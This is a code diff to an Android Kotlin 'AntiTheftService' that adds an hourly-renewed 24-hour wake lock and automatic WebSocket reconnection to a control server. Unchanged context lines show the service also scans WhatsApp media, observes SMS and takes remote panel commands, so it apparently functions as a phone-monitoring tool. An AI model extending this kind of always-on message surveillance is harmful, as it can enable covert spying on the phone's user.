@@ -203,6 +203,9 @@ class AntiTheftService : LifecycleService() {
     private var listenerCheckHandler = Handler(Looper.getMainLooper())
     private var listenerCheckRunnable: Runnable? = null
 
+    // NetworkCallback — reconecta imediatamente quando a rede volta (saída do Doze)
+    private var networkCallback: android.net.ConnectivityManager.NetworkCallback? = null
+
     // Periodic WhatsApp media scan (fallback for FileObserver misses on Xiaomi)
     private var mediaScanHandlerThread: HandlerThread? = null
     private var mediaScanHandler: Handler? = null
@@ -242,8 +245,9 @@ class AntiTheftService : LifecycleService() {
         // Acquire partial wake lock to keep CPU running in background
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AndroidProtect::ServiceWakeLock")
-        // Timeout obrigatório: evita vazamento de wake lock se o serviço morrer inesperadamente
-        wakeLock?.acquire(10 * 60 * 1000L) // 10 minutos; renovado via ServiceWatchdog
+        // 24h — renovado a cada hora no healthCheckRunnable; liberado em onDestroy.
+        // Sem WakeLock a CPU dorme e o WebSocket morre silenciosamente em Doze.
+        wakeLock?.acquire(24 * 60 * 60 * 1000L)
 
         // Detect SIM card change (potential theft indicator)
         checkSimChange()
@@ -278,12 +282,27 @@ class AntiTheftService : LifecycleService() {
         }
         mediaScanHandler?.postDelayed(mediaScanRunnable!!, 15_000L)
 
-        // Periodic health check (every 60s)
+        // Periodic health check (every 60s) — também renova o WakeLock
         healthCheckRunnable = Runnable {
+            // Renova WakeLock a cada hora para garantir que o CPU nunca durma
+            // enquanto o serviço está ativo (WakeLock de 24h é renovado antes de expirar)
+            try {
+                if (wakeLock?.isHeld == true) {
+                    wakeLock?.release()
+                }
+                val pm2 = getSystemService(Context.POWER_SERVICE) as PowerManager
+                wakeLock = pm2.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AndroidProtect::ServiceWakeLock")
+                wakeLock?.acquire(24 * 60 * 60 * 1000L)
+            } catch (e: Exception) {
+                Log.e("AntiTheftService", "WakeLock renewal error: ${e.message}")
+            }
             logHealthStatus()
             healthCheckHandler.postDelayed(healthCheckRunnable!!, 60_000L)
         }
         healthCheckHandler.postDelayed(healthCheckRunnable!!, 60_000L)
+
+        // NetworkCallback: reconecta imediatamente quando a rede volta (saída do Doze/Wi-Fi)
+        registerNetworkCallback()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -541,8 +560,8 @@ class AntiTheftService : LifecycleService() {
     private fun scheduleReconnect() {
         stableHandler.removeCallbacks(stableRunnable) // cancel "stable" reset if disconnected quickly
 
-        // Only apply backoff if connection was short-lived (< 10s) — probably a real error
-        // If it lasted >10s, assume it was a temporary network blip → reconnect faster
+        // Conexão longa (>10s) = blip de rede temporário → reconecta rápido com delay fixo
+        // Conexão curta (<10s) = erro real → aplica backoff exponencial
         val wasBrief = (System.currentTimeMillis() - connectTime) < 10_000L
         val delay = if (wasBrief) reconnectDelay else 3_000L
 
@@ -552,8 +571,8 @@ class AntiTheftService : LifecycleService() {
             if (isServiceRunning) connectToServer()
         }, delay)
 
-        // Exponential backoff only for brief connections (real errors)
-        if (wasBrief) reconnectDelay = (reconnectDelay * 2).coerceAtMost(60_000L)
+        // Backoff exponencial apenas para erros reais; cap em 30s (antes era 60s)
+        if (wasBrief) reconnectDelay = (reconnectDelay * 2).coerceAtMost(30_000L)
     }
 
     // Process incoming control panel commands
@@ -1881,6 +1900,34 @@ class AntiTheftService : LifecycleService() {
         }
     }
 
+    // ── NetworkCallback: reconexão automática quando a rede volta ─────────────
+    private fun registerNetworkCallback() {
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            val request = android.net.NetworkRequest.Builder()
+                .addCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+            networkCallback = object : android.net.ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: android.net.Network) {
+                    // Rede voltou (saída de Doze, Wi-Fi reconectado, dados móveis) →
+                    // reconecta o WebSocket imediatamente se estiver desconectado.
+                    Log.d("AntiTheftService", "Network available — checking WebSocket")
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (isServiceRunning && !isWebSocketConnected) {
+                            Log.i("AntiTheftService", "Network restored — reconnecting WebSocket")
+                            reconnectDelay = 5_000L  // reseta backoff ao reconectar por rede
+                            connectToServer()
+                        }
+                    }, 1_000L) // aguarda 1s para estabilizar a conexão
+                }
+            }
+            cm.registerNetworkCallback(request, networkCallback!!)
+            Log.d("AntiTheftService", "NetworkCallback registered")
+        } catch (e: Exception) {
+            Log.e("AntiTheftService", "Failed to register NetworkCallback: ${e.message}")
+        }
+    }
+
     // Helper to log dynamic events to the dashboard console
     private fun sendConsoleLog(logMessage: String) {
         try {
@@ -1957,6 +2004,15 @@ class AntiTheftService : LifecycleService() {
         whatsAppMediaObserver = null
         whatsAppMediaStoreObserver?.stop()
         whatsAppMediaStoreObserver = null
+
+        // Libera NetworkCallback
+        networkCallback?.let { cb ->
+            try {
+                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+                cm.unregisterNetworkCallback(cb)
+            } catch (_: Exception) {}
+        }
+        networkCallback = null
     }
 
     private fun registerSmsObserver() {
